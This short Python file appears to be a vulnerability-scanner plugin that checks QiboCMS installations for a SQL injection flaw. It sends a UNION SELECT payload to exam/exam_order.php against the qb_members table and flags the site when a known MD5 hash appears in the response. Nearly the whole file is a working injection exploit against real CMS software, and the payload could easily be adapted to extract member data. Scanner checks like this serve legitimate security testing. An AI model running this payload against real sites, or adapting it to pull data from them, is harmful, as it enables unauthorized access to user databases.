#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    payload='exam/exam_order.php?id=29&and=and%201=2%20union%20select%201,2,md5(1234),4,5,6,7,md5(1234),9,10,11%20from%20qb_members'
    url=arg+payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms','http://127.0.0.1:8080/qibocms/')[1])

